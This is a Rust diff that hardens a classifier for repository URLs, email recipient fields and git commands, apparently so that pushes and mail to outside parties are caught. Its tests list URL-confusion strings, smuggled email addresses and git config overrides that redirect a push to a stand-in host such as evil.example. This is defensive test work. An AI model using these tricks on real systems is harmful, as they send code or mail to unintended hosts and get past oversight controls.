@@ -222,15 +222,34 @@ impl RepoRef {
 #[must_use]
 pub fn parse_repo(repo: &str, bare_host: Option<&str>) -> Option<RepoRef> {
     let r = repo.trim();
+    // Anything a URL parser could read two ways is not a repository: a query, a fragment, an escape, a backslash.
+    if r.is_empty() || r.contains(['?', '#', '%', '\\', '"', '\'', ' ', '\t', '\n']) {
+        return None;
+    }
     let (host, path) = if let Some((_, rest)) = r.split_once("://") {
+        // The authority ends at the first `/`; at most one `@` (userinfo), then the host and maybe a port.
         let (authority, path) = rest.split_once('/')?;
-        let host = authority.rsplit_once('@').map_or(authority, |(_, h)| h);
-        let host = host.split_once(':').map_or(host, |(h, _)| h);
+        if authority.matches('@').count() > 1 {
+            return None;
+        }
+        let host = authority.split_once('@').map_or(authority, |(_, h)| h);
+        let host = match host.split_once(':') {
+            Some((h, port)) if !port.is_empty() && port.chars().all(|c| c.is_ascii_digit()) => h,
+            Some(_) => return None,
+            None => host,
+        };
         (host.to_ascii_lowercase(), path)
     } else if let Some((user_host, path)) = r.split_once(':') {
-        let (_, host) = user_host.rsplit_once('@')?;
+        // `user@host:owner/name`: exactly one `@`, nothing else before the `:`.
+        if user_host.matches('@').count() != 1 || path.contains(':') || path.contains('@') {
+            return None;
+        }
+        let (_, host) = user_host.split_once('@')?;
         (host.to_ascii_lowercase(), path)
     } else {
+        if r.contains('@') {
+            return None;
+        }
         let mut parts = r.splitn(3, '/');
         match (parts.next(), parts.next(), parts.next()) {
             (Some(h), Some(_), Some(_)) if h.contains('.') => {
@@ -240,7 +259,7 @@ pub fn parse_repo(repo: &str, bare_host: Option<&str>) -> Option<RepoRef> {
             _ => return None,
         }
     };
-    if !host_name(&host) {
+    if !host_name(&host) || host.starts_with(['.', '-']) || host.ends_with('.') {
         return None;
     }
     let path = path.trim_end_matches('/');
@@ -272,19 +291,45 @@ pub fn repo_zone(facts: &Facts, repo: &RepoRef) -> (Zone, Option<Unknown>) {
     }
 }
 
-/// An email address's domain, when it looks like one address.
+/// An email address's domain, when it is plainly one address: exactly one `@`, and no quotes, `%`, `<>`, `!`,
+/// whitespace or commas anywhere (each can route mail elsewhere or hide a second address). Anything else has no
+/// domain, so no domain fact covers it.
 fn address_domain(addr: &str) -> Option<&str> {
-    let (local, domain) = addr.rsplit_once('@')?;
-    (!local.is_empty() && !local.contains(char::is_whitespace) && domain.contains('.') && login(domain))
-        .then_some(domain)
+    if addr.chars().any(|c| c.is_whitespace() || matches!(c, '"' | '%' | '<' | '>' | ',' | '!' | '\'' | '\\')) {
+        return None;
+    }
+    let (local, domain) = addr.split_once('@')?;
+    (!local.is_empty() && !domain.contains('@') && domain.contains('.') && host_name(domain)).then_some(domain)
 }
 
-/// `Name <a@b.c>` → `a@b.c`.
-fn bare_address(party: &str) -> &str {
-    match (party.rfind('<'), party.rfind('>')) {
-        (Some(a), Some(b)) if a < b => &party[a + 1..b],
-        _ => party,
+/// The addresses in one recipient field: a list split on `,` and `;`, each a plain address or `Name <address>`
+/// (one pair of angle brackets, at the end, a name with no `@`, quotes or brackets). `None` when any part isn't a
+/// well-formed mailbox: then the field is Outside.
+#[must_use]
+pub fn mailboxes(field: &str) -> Option<Vec<String>> {
+    let mut out = Vec::new();
+    for part in field.split([',', ';']) {
+        let part = part.trim();
+        if part.is_empty() {
+            continue;
+        }
+        let addr = match part.find('<') {
+            Some(open) => {
+                let name = &part[..open];
+                let inner = part[open + 1..].strip_suffix('>')?;
+                if name.contains(['@', '"', '<', '>']) || inner.contains(['<', '>']) {
+                    return None;
+                }
+                inner.trim()
+            }
+            None if part.contains('>') => return None,
+            None => part,
+        };
+        let addr = key(addr)?;
+        address_domain(&addr)?;
+        out.push(addr);
     }
+    (!out.is_empty()).then_some(out)
 }
 
 /// A chat party a fact can be kept for: a numeric id, an `@username` or a `+number`. A chat's display name isn't:
@@ -311,8 +356,9 @@ pub fn party_zone(facts: &Facts, channel: &Channel, party: &str) -> (Zone, Optio
         )
     };
     match channel {
+        // One mailbox, as [`mailboxes`] splits a field (anything else is Outside).
         Channel::Email | Channel::Calendar => {
-            let Some(addr) = key(bare_address(party)) else {
+            let Some(addr) = mailboxes(party).filter(|m| m.len() == 1).and_then(|m| m.into_iter().next()) else {
                 return (Zone::Outside, None);
             };
             if facts.own_addresses.contains(&addr) {
@@ -403,7 +449,8 @@ pub fn repo_at(command: &str, cwd: &str, top: Option<&str>, home: &str) -> RepoA
     let mut at = RepoAt::Cwd;
     let mut in_git = false;
     for (i, t) in tokens.iter().enumerate() {
-        if t.starts_with("GIT_DIR=") || t.starts_with("GIT_WORK_TREE=") {
+        // Where the repository is, or what its configuration says (`remote.origin.url`), set on the line.
+        if t.starts_with("GIT_DIR=") || t.starts_with("GIT_WORK_TREE=") || t.starts_with("GIT_CONFIG") {
             return RepoAt::Unknown;
         }
         match t.as_str() {
@@ -423,8 +470,15 @@ pub fn repo_at(command: &str, cwd: &str, top: Option<&str>, home: &str) -> RepoA
                 }
             }
             "git" => in_git = true,
-            "-C" | "--git-dir" | "--work-tree" if in_git => return RepoAt::Unknown,
-            _ if in_git && (t.starts_with("--git-dir=") || t.starts_with("--work-tree=")) => return RepoAt::Unknown,
+            "-C" | "-c" | "--git-dir" | "--work-tree" | "--config-env" if in_git => return RepoAt::Unknown,
+            _ if in_git
+                && (t.starts_with("--git-dir=")
+                    || t.starts_with("--work-tree=")
+                    || t.starts_with("--config-env=")
+                    || (t.starts_with("-c") && t.len() > 2)) =>
+            {
+                return RepoAt::Unknown;
+            }
             _ if !t.starts_with('-') => in_git = false,
             _ => {}
         }
@@ -535,6 +589,20 @@ pub fn request_zone(a: &Analysis, facts: &Facts, base: &Base<'_>) -> Resolved {
                     add(Zone::Outside, None);
                 }
                 for p in to {
+                    if matches!(channel, Channel::Email | Channel::Calendar) {
+                        // Each mailbox of the field on its own; a field that doesn't parse is Outside.
+                        if let Some(list) = mailboxes(p) {
+                            for addr in list {
+                                let (z, u) = party_zone(facts, channel, &addr);
+                                parties.insert(addr);
+                                add(z, u);
+                            }
+                        } else {
+                            parties.insert(p.trim().to_ascii_lowercase());
+                            add(Zone::Outside, None);
+                        }
+                        continue;
+                    }
                     let (z, u) = if *channel != Channel::GitHub {
                         parties.insert(p.trim().to_ascii_lowercase());
                         party_zone(facts, channel, p)
@@ -781,6 +849,19 @@ mod tests {
     #[test]
     fn work_domain_recipients_are_work() {
         assert_eq!(request_zone(&mail(&["Bob <bob@acme.io>"]), &facts(), &Base::default()).zone, Zone::Work);
+        assert_eq!(request_zone(&mail(&["BOB@ACME.IO"]), &facts(), &Base::default()).zone, Zone::Work);
+        // Only a plain address takes its domain's zone.
+        for odd in [
+            "evil%attacker.com@acme.io",
+            "\"x@attacker.com\"@acme.io",
+            "a@b@acme.io",
+            "x@attacker.com,y@acme.io",
+            "a!b@acme.io",
+            "a@acme.io.",
+            "a@sub.acme.io",
+        ] {
+            assert_eq!(request_zone(&mail(&[odd]), &facts(), &Base::default()).zone, Zone::Outside, "{odd}");
+        }
     }
 
     #[test]
@@ -809,6 +890,51 @@ mod tests {
         // A remote named like a repository is still a remote.
         let named = analyze_command("git push dkat/app feat/x", &ctx());
         assert_eq!(request_zone(&named, &f, &mine).zone, Zone::Outside);
+    }
+
+    #[test]
+    fn ambiguous_urls_are_outside() {
+        let f = facts();
+        for url in [
+            "https://evil.example#@github.com/dkat/reins",
+            "https://evil.example?@github.com/dkat/reins",
+            "https://a@b@github.com/dkat/reins",
+            "https://github.com%2fdkat/reins",
+            "https://evil.example\\@github.com/dkat/reins",
+            "https://github.com:x/dkat/reins",
+            "git@evil.example:x@github.com:dkat/reins",
+            "github.com/dkat/reins?x",
+        ] {
+            assert_eq!(request_zone(&push(url), &f, &Base::default()).zone, Zone::Outside, "{url}");
+        }
+        assert_eq!(
+            request_zone(&push("https://user@github.com/dkat/reins.git"), &f, &Base::default()).zone,
+            Zone::Mine
+        );
+        assert_eq!(request_zone(&push("https://github.com:443/dkat/reins"), &f, &Base::default()).zone, Zone::Mine);
+    }
+
+    #[test]
+    fn recipient_fields_are_each_mailbox() {
+        let f = facts();
+        // A field naming two people: each on its own, the least trusted wins.
+        let r = request_zone(&mail(&["ann@example.com, x@stranger.io"]), &f, &Base::default());
+        assert_eq!(r.zone, Zone::Outside);
+        assert_eq!(r.parts, vec!["ann@example.com".to_owned(), "x@stranger.io".to_owned()]);
+        assert_eq!(
+            request_zone(&mail(&["Ann <ann@example.com>; me@gmail.com"]), &f, &Base::default()).zone,
+            Zone::Friends
+        );
+        // The last angle brackets don't decide.
+        for odd in [
+            "x@stranger.io <ann@example.com>",
+            "Ann <x@stranger.io> <ann@example.com>",
+            "<ann@example.com",
+            "ann@example.com>",
+            "\"Ann\" <ann@example.com>",
+        ] {
+            assert_eq!(request_zone(&mail(&[odd]), &f, &Base::default()).zone, Zone::Outside, "{odd}");
+        }
     }
 
     #[test]
@@ -872,6 +998,11 @@ mod tests {
             "cd && git push",
             "cd $DIR && git push",
             "cd /a && cd /b && git push",
+            "git -c remote.origin.url=https://evil.example/x push origin",
+            "git -cremote.origin.pushurl=x push origin",
+            "git --config-env=remote.origin.url=EVIL push origin",
+            "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=remote.origin.url GIT_CONFIG_VALUE_0=x git push origin",
+            "GIT_CONFIG_PARAMETERS=x git push",
         ] {
             assert_eq!(repo_at(c, cwd, top, home), RepoAt::Unknown, "{c}");
         }
